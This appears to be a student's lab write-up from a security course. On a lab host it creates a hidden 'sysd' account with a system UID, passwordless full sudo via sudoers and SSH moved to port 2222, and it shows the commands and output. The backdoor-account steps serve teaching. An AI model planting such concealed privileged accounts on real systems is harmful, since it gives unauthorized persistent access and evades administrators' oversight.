Step 1: Shadow People
1.	Create a secret user named sysd. Make sure this user doesn't have a home folder created:
o	The first thing I did was login to the target system as sysadmin:
sysadmin@UbuntuDesktop:~$ ssh sysadmin@192.168.6.105
The authenticity of host '192.168.6.105 (192.168.6.105)' can't be established.
ECDSA key fingerprint is SHA256:uoOQp+ntlpFyltJnig+s1pq8G7pPX/ZHm09UFe3vXi4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.6.105' (ECDSA) to the list of known hosts.
sysadmin@192.168.6.105's password:

Last login: Sat Feb  6 19:05:59 2021 from 192.168.6.1
sysadmin:~\ $
o	 and then sudo to the root shell, with sudo -s
o	I then created the sysd user:
 sysadmin:~\ $ sudo -s
[sudo] password for sysadmin: 
root:~\ $ adduser --no-create-home   sysd
Adding user `sysd' ...
Adding new group `sysd' (1007) ...
Adding new user `sysd' (1007) with group `sysd' ...
Not creating home directory `/home/sysd'.
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for sysd
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] Not creating home directory 
â€¢	Give your secret user a password: This was done during the user creation above
2.	`/home/sysd'.Give your secret user a system UID < 1000:
root:~\ $ usermod -u 301 sysd
3.	Give your secret user the same GID:
root:~\ $ groupmod -g 301 sysd
cat /etc/passwd | grep sysd
sysd:x:301:301:,,,:/home/sysd:/bin/bash
4.	Give your secret user full sudo access without the need for a password:
root:~\ $ visudo
  GNU nano 2.9.3                  /etc/sudoers.tmp                             

%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

# Vagrant Privs for config
vagrant ALL=(ALL) NOPASSWD:ALL
sysadmin  ALL=(ALL:ALL) /usr/bin/less
sysd ALL=(ALL) NOPASSWD:ALL
5.	Test that sudo access works without your password:
Your bash commands here:
sysadmin:~\ $ su sysd
Password: 
sysd@scavenger-hunt:/home/sysadmin$ sudo -l
Matching Defaults entries for sysd on scavenger-hunt:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysd may run the following commands on scavenger-hunt:
    (ALL) NOPASSWD: ALL
Step 2: Smooth Sailing
1.	Edit the sshd_config file:
Your bash commands here. 
sysd@scavenger-hunt:/home/sysadmin$ sudo -s
root@scavenger-hunt:/home/sysadmin# nano /etc/ssh/sshd_config 
  GNU nano 2.9.3                /etc/ssh/sshd_config                           

#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 2222
Step 3: Testing Your Configuration Update
1.	Restart the SSH service:
root@scavenger-hunt:/home/sysadmin# systemctl restart sshd
Exit the root account:
root@scavenger-hunt:/home/sysadmin# exit
exit
sysd@scavenger-hunt:/home/sysadmin$ 
2.	
3.	SSH to the target machine using your sysd account and port 2222:
sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
sysd@192.168.6.105's password: 
Use sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
sysd@192.168.6.105's password:
